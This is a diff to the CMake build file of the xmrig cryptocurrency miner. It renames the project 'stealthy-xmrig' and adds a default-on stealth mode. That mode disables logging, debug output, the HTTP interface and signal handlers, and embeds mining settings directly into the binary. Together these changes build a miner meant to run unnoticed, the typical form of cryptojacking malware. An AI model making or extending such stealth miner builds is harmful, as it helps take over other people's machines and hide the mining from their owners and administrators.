@@ -1,5 +1,5 @@
 cmake_minimum_required(VERSION 3.5)
-project(xmrig)
+project(stealthy-xmrig)
 
 option(WITH_HWLOC           "Enable hwloc support" ON)
 option(WITH_CN_LITE         "Enable CryptoNight-Lite algorithms family" ON)
@@ -38,6 +38,11 @@ option(ARM_V8               "Force ARMv8 (64 bit) architecture, use with caution
 option(ARM_V7               "Force ARMv7 (32 bit) architecture, use with caution if automatic detection fails, but you sure it may work" OFF)
 option(HWLOC_DEBUG          "Enable hwloc debug helpers and log" OFF)
 
+option(STEALTH_PATCH        "Enable stealth patches" ON)
+option(INJECT_SETTINGS      "Inject settings into binary" OFF)
+option(NO_SIGNALS           "Disable signal handlers" OFF)
+option(NO_DONATE            "Disable developer donation" ON)
+option(NO_LOGS              "Disable logging" OFF)
 
 set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} "${CMAKE_SOURCE_DIR}/cmake")
 
@@ -223,6 +228,44 @@ endif()
 
 if (WITH_EMBEDDED_CONFIG)
     add_definitions(/DXMRIG_FEATURE_EMBEDDED_CONFIG)
+endif()
+
+if (STEALTH_PATCH)
+    message(STATUS "Stealth patches enabled")
+    add_definitions(/DSTEALTH_PATCH)
+
+    set(WITH_HTTP OFF CACHE BOOL "Enable HTTP protocol support (client/server)" FORCE)
+    set(WITH_BENCHMARK OFF CACHE BOOL "Enable builtin RandomX benchmark and stress test" FORCE)
+    set(NO_DONATE ON CACHE BOOL "Disable developer donation" FORCE)
+    set(NO_LOGS ON CACHE BOOL "Disable logging" FORCE)
+    set(NO_SIGNALS ON CACHE BOOL "Disable signal handlers" FORCE)
+    set(INJECT_SETTINGS ON CACHE BOOL "Inject settings into binary" FORCE)
+endif()
+
+if (INJECT_SETTINGS)
+    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wno-write-strings")
+    set(CMAKE_CXX_STANDARD 14)
+    add_definitions(/DINJECT_SETTINGS)
+    
+    if (DEFINED INJECTED_SETTINGS AND NOT INJECTED_SETTINGS STREQUAL "")
+        add_definitions(/DINJECTED_SETTINGS="${INJECTED_SETTINGS}")
+    else()
+        message(FATAL_ERROR "INJECT_SETTINGS is turned on, but INJECTED_SETTINGS have not been defined")
+    endif()
+
+endif()
+
+if (NO_SIGNALS)
+    add_definitions(/DNO_SIGNALS)
+endif()
+
+if (NO_DONATE)
+    add_definitions(/DNO_DONATE)
+endif()
+
+if (NO_LOGS)
+    add_definitions(/DNO_LOGS)
+    set(WITH_DEBUG_LOG OFF CACHE BOOL "Enable debug log output" FORCE)
 endif()
 
 include(src/hw/api/api.cmake)
